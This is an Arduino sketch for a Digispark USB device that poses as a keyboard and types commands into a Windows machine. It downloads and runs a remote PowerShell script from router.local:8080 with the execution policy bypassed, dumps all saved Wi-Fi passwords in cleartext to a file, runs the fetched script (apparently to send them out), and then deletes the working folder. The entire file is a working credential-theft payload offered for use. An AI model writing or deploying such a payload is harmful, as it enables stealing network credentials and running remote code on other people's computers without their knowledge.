#include "DigiKeyboard.h"
/* Init function */
void setup()
{
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run

  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //DigiKeyboard.println("cd C:/temp & mkdir wifi & cd wifi & echo (wget http://router.local:8080/ -outfile maintenance.ps1) > b.ps1");
  DigiKeyboard.println("cd C:/temp & mkdir wifi & cd wifi & echo ((New-Object System.Net.WebClient).DownloadFile(@http://router.local:8080/maintenance.ps1@, @c:/temp/wifi/maintenance.ps1@)) > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("netsh wlan show profile * key=clear > c:/temp/wifi/passwords.txt");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File maintenance.ps1");
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd C:/temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("rmdir /Q /S wifi");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
